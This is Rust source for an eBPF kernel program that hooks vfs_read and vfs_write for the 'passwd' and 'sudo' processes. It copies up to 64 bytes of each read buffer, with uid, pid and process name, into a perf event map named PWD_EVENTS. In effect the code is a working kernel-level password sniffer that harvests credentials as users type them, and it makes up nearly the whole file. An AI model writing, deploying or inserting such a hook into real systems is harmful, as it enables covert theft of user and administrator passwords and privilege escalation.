#![no_std]
#![no_main]

use shared::HookingFullEvent;
use aya_ebpf::{
    macros::{
        map, kprobe,
    },
    maps::PerfEventArray,
    programs::{ ProbeContext },
    helpers::{
        bpf_get_current_pid_tgid,
        bpf_get_current_uid_gid,
        bpf_get_current_comm,
    },
};
use aya_ebpf::macros::kretprobe;
use aya_ebpf::maps::HashMap;
use aya_ebpf::programs::RetProbeContext;

#[unsafe(link_section = "license")]
pub static LICENSE: &[u8] = b"GPL\0";   // Licence for ebpf module - Required by kernel to load the module, GPL is the most common and compatible with most of the kernel code.

#[unsafe(link_section = "version")]
pub static VERSION: u32 = 0;            // Optional: specify kernel version (0 means "any")

#[map(name = "BUFFERS")]
static BUFFERS: HashMap<u32, usize> = HashMap::with_max_entries(1024, 0);

#[map(name = "PWD_EVENTS")]
static PWD_EVENTS: PerfEventArray<HookingFullEvent> = PerfEventArray::new(0);

// Hook Write (VFS_WRITE)
#[kprobe]
pub fn handle_vfs_write(ctx: ProbeContext) -> u32 {
    if let Ok(comm) = bpf_get_current_comm() {
        if !is_interesting_process(&comm) {
            return 0;
        }

        let uid = (bpf_get_current_uid_gid() & 0xFFFF_FFFF) as u32;
        let pid = (bpf_get_current_pid_tgid() & 0xFFFF_FFFF) as u32;

        let event = HookingFullEvent {
            uid,
            pid,
            comm,
            _pad: [1, 1, 1],
            data: [0; 64],
        };
        PWD_EVENTS.output(&ctx, &event, 0);
    }
    0
}

// Hook Read - enter (VFS_READ)
#[kprobe]
pub fn handle_read_enter(ctx: ProbeContext) -> u32 {
    let tid = (bpf_get_current_pid_tgid() >> 32) as u32;

    let buf_addr: usize = ctx.arg(1).unwrap_or(0);

    if buf_addr != 0 {
        let _ = BUFFERS.insert(&tid, &buf_addr, 0);
    }
    0
}

// Hook Read - return (VFS_READ)
#[kretprobe]
pub fn handle_read_return(ctx: RetProbeContext) -> u32 {
    let tid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_addr = match unsafe { BUFFERS.get(&tid) } { Some(addr) => *addr, None => return 0, };   // Retrieve address
    let _ = BUFFERS.remove(&tid);
    let Ok(comm) = bpf_get_current_comm() else { return 0; };

    if !is_interesting_process(&comm) { return 0; }         // Filtering data by process

    let ret: isize = ctx.ret();                             // Byte readed
    if ret <= 0 { return 0; }

    let mut event = HookingFullEvent {
        uid: (bpf_get_current_uid_gid() & 0xFFFF_FFFF) as u32,
        pid: (bpf_get_current_pid_tgid() & 0xFFFF_FFFF) as u32,
        comm,
        data: [0u8; 64],
        _pad: [2, 2, 2],
    };

    let len = if ret < 64 { ret as usize } else { 64 };         // Read data fromm users sppace
    unsafe {
        if aya_ebpf::helpers::bpf_probe_read_user_buf(
            buf_addr as *const u8,
            &mut event.data[..len]
        ).is_err() {
            return 0;
        }
    }

    let _ = PWD_EVENTS.output(&ctx, &event, 0);
    0
}

#[inline(always)]
fn is_interesting_process(comm: &[u8; 16]) -> bool {
    let targets: &[&[u8]] = &[b"passwd", b"sudo"];                      // Processes to monitor (null-terminated or 16 bytes long)

    for t in targets {
        let t_len = t.len();
        let mut is_match = true;
        for i in 0..16 {
            if i >= t_len { break; }
            if comm[i] != t[i] {
                is_match = false;
                break;
            }
        }

        if is_match && (t_len == 16 || comm[t_len] == 0) {
            return true;
        }
    }
    false
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
        unsafe {
            core::hint::unreachable_unchecked()
        }
    }
}